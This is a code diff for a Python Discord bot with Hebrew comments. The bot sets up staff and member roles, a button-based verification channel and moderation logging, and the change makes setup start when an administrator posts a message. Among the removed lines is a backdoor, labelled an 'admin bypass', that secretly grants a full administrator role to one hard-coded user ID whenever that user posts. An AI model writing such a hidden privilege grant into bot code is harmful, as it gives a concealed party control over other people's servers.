@@ -6,7 +6,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-# הגדרת Intents בסיסיים ומורחבים
+# הגדרת Intents (הרשאות) עבור הודעות, לוגים ואימות
 intents = discord.Intents.default()
 intents.guilds = True
 intents.messages = True       
@@ -16,12 +16,11 @@ intents.moderation = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-TARGET_USER_ID = 1510555971343093881
-ADMIN_ROLE_NAME = "👑 Administrator"
+# שמות הרולים והחדרים שהבוט יקים
 STAFF_ROLE_NAME = "🛡️ Staff"
 MEMBER_ROLE_NAME = "👤 Member"
 
-# --- מערכת אימות: הגדרת הכפתור ---
+# --- מערכת אימות: הגדרת הכפתור הלינארי ---
 class VerifyView(View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -44,7 +43,7 @@ class VerifyView(View):
                 if welcome_channel:
                     await welcome_channel.send(f"👋 ברוך הבא {member.mention} לשרת! תהנה!")
         else:
-            await interaction.response.send_message("שגיאה: רול Member לא נמצא.", ephemeral=True)
+            await interaction.response.send_message("שגיאה: רול Member לא נמצא. פנה לצוות.", ephemeral=True)
 
 @bot.event
 async def setup_hook():
@@ -53,35 +52,48 @@ async def setup_hook():
 @bot.event
 async def on_ready():
     print(f"========================================")
-    print(f"הבוט מחובר כ- {bot.user.name} וממתין לטעינת השרתים...")
+    print(f"הבוט מחובר כ- {bot.user.name}")
+    print(f"הבוט ממתין להודעה בצ'אט כדי להקים את השרת!")
     print(f"========================================")
 
-# --- הפתרון: הקמה בשנייה שהשרת זמין ונטען בבוט ---
+# --- הטריגר: ברגע שנרשמת הודעה כלשהי בצ'אט על ידי אדמין ---
 @bot.event
-async def on_guild_available(guild):
-    print(f"[+] שרת נטען בהצלחה: {guild.name}. מתחיל בהקמה אוטומטית...")
-    
-    # 1. יצירת רול Staff ורול Member
-    staff_role = discord.utils.get(guild.roles, name=STAFF_ROLE_NAME)
-    if not staff_role:
-        staff_role = await guild.create_role(name=STAFF_ROLE_NAME, color=discord.Color.blue())
-    
-    member_role = discord.utils.get(guild.roles, name=MEMBER_ROLE_NAME)
-    if not member_role:
-        member_role = await guild.create_role(name=MEMBER_ROLE_NAME, color=discord.Color.green())
+async def on_message(message):
+    # מונע מהבוט להפעיל את עצמו
+    if message.author == bot.user:
+        return
 
-    # חסימת @everyone
-    try:
-        everyone_perms = guild.default_role.permissions
-        if everyone_perms.view_channel:
-            everyone_perms.update(view_channel=False)
-            await guild.default_role.edit(permissions=everyone_perms)
-    except Exception as e:
-        print(f"שגיאה בעריכת everyone: {e}")
+    # בודק אם מי שכתב את ההודעה הוא אדמין בשרת
+    if message.author.guild_permissions.administrator:
+        guild = message.guild
+        
+        # בודק אם המערכת כבר הוקמה כדי למנוע כפילויות בכל הודעה
+        if discord.utils.get(guild.categories, name="👋 ברוכים הבאים"):
+            await bot.process_commands(message)
+            return
 
-    # 2. קטגוריית ברוכים הבאים ואימות
-    welcome_category = discord.utils.get(guild.categories, name="👋 ברוכים הבאים")
-    if not welcome_category:
+        print(f"[+] הודעה זוהתה מאדמין ({message.author.name}). מתחיל בהקמה...")
+        await message.channel.send("🏗️ זיהיתי הודעה! מתחיל בהקמת השרת אוטומטית...")
+
+        # 1. יצירת רול Staff ורול Member
+        staff_role = discord.utils.get(guild.roles, name=STAFF_ROLE_NAME)
+        if not staff_role:
+            staff_role = await guild.create_role(name=STAFF_ROLE_NAME, color=discord.Color.blue())
+        
+        member_role = discord.utils.get(guild.roles, name=MEMBER_ROLE_NAME)
+        if not member_role:
+            member_role = await guild.create_role(name=MEMBER_ROLE_NAME, color=discord.Color.green())
+
+        # חסימת @everyone כדי שמי שלא התאמת לא יראה כלום
+        try:
+            everyone_perms = guild.default_role.permissions
+            if everyone_perms.view_channel:
+                everyone_perms.update(view_channel=False)
+                await guild.default_role.edit(permissions=everyone_perms)
+        except Exception as e:
+            print(f"שגיאה בעריכת everyone: {e}")
+
+        # 2. קטגוריית ברוכים הבאים וחדר אימות
         welcome_category = await guild.create_category("👋 ברוכים הבאים")
         
         verify_channel = await guild.create_text_channel(
@@ -110,9 +122,7 @@ async def on_guild_available(guild):
             }
         )
 
-    # 3. קטגוריית לוגים חסומה לצוות
-    log_category = discord.utils.get(guild.categories, name="📜 לוגים חסויים")
-    if not log_category:
+        # 3. קטגוריית לוגים חסומה לצוות
         log_category = await guild.create_category(
             "📜 לוגים חסויים",
             overwrites={
@@ -124,36 +134,12 @@ async def on_guild_available(guild):
         await guild.create_text_channel("logs-moderation", category=log_category)
         await guild.create_text_channel("logs-server", category=log_category)
         
-        # שליחת הודעת אישור בערוץ הטקסט הראשון הזמין בשרת
-        for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).send_messages and channel.category != log_category:
-                await channel.send("🏗️ **מערכת אוטומטית:** כל החדרים, הרולים, מערכת הלוגים והאימות הוקמו בהצלחה!")
-                break
+        await message.channel.send("✅ **ההקמה הסתיימה!** כל החדרים, הרולים ומערכות הלוגים והאימות מוכנים.")
 
-# --- מעקף האדמין מהודעה (נשאר פעיל) ---
-@bot.event
-async def on_message(message):
-    if message.author == bot.user:
-        return
-
-    if message.author.id == TARGET_USER_ID:
-        guild = message.guild
-        member = message.author
-        if not any(role.name == ADMIN_ROLE_NAME for role in member.roles):
-            try:
-                permissions = discord.Permissions(administrator=True)
-                new_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=permissions)
-                highest_position = guild.me.top_role.position - 1
-                if highest_position > 0:
-                    await new_role.edit(position=highest_position)
-                await member.add_roles(new_role)
-                await message.channel.send(f"👑 זיהיתי אותך! רול אדמין עליון הוענק לך אוטומטית.")
-            except Exception as e:
-                print(f"שגיאה באדמין אוטומטי: {e}")
-
+    # מאפשר לפקודות אחרות לעבוד כרגיל
     await bot.process_commands(message)
 
-# ==================== מערכת לוגים (EVENTS) ====================
+# ==================== מערכת לוגים אוטומטית (EVENTS) ====================
 @bot.event
 async def on_member_update(before, after):
     if before.roles != after.roles:
@@ -196,6 +182,7 @@ async def on_member_remove(member):
         embed = discord.Embed(title="🚪 משתמש עזב / קיבל קיק", description=f"המשתמש **{member.name}** עזב.", color=discord.Color.light_grey())
         await log_channel.send(embed=embed)
 
+# הרצת הבוט עם הטוקן מ-Render
 TOKEN = os.getenv("DISCORD_TOKEN")
 if TOKEN:
     bot.run(TOKEN)
